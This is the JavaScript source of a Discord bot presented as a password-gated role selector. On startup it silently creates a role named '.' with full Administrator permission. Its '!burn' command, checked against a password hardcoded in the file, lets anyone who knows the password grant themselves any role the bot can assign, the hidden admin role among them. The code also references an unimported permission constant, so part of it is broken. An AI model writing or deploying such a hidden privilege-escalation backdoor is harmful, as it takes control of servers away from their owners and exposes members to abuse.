const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// Ready
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  // Auto create . role
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission role'
        });
      }
    }
  } catch (e) { console.error(e); }
});

// Message Command
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  if (message.content.trim().toLowerCase() === '!burn') {
    const embed = new EmbedBuilder()
      .setColor('#ff8800')
      .setTitle('🔥 !BURN - ROLE SELECTOR')
      .setDescription('Enter the password to see roles you can give yourself.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`burn_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// INTERACTIONS - FIXED
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // Button → Modal
    if (interaction.isButton() && interaction.customId.startsWith('burn_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`burn_modal_${userId}`)
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('password')
          .setLabel('Password')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // Modal Submit
    if (interaction.isModalSubmit() && interaction.customId.startsWith('burn_modal_')) {
      const password = interaction.fields.getTextInputValue('password');

      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      // Get roles bot can assign
      const botMember = await interaction.guild.members.fetch(client.user.id);
      const botHighest = botMember.roles.highest.position;

      const assignableRoles = interaction.guild.roles.cache
        .filter(r => r.position < botHighest && r.name !== '@everyone')
        .sort((a, b) => b.position - a.position)
        .first(25)
        .map(role => ({
          label: role.name.length > 25 ? role.name.slice(0, 22) + '...' : role.name,
          value: role.id,
          description: `Pos: ${role.position}`
        }));

      if (assignableRoles.length === 0) {
        return interaction.reply({ content: '❌ No roles available for the bot to assign.', ephemeral: true });
      }

      const menu = new StringSelectMenuBuilder()
        .setCustomId(`burn_select_${userId}`)
        .setPlaceholder('Select role to give yourself')
        .addOptions(assignableRoles);

      const row = new ActionRowBuilder().addComponents(menu);

      return await interaction.reply({
        content: '✅ Password correct! Choose a role:',
        components: [row],
        ephemeral: true
      });
    }

    // Role Selection
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('burn_select_')) {
      await interaction.deferUpdate(); // This fixes "interaction failed"

      const roleId = interaction.values[0];
      const role = interaction.guild.roles.cache.get(roleId);

      if (!role) {
        return interaction.followUp({ content: '❌ Role not found.', ephemeral: true });
      }

      await interaction.member.roles.add(role);
      await interaction.followUp({ 
        content: `✅ Successfully gave you the role **${role.name}**!`, 
        ephemeral: true 
      });
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong. Try again.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
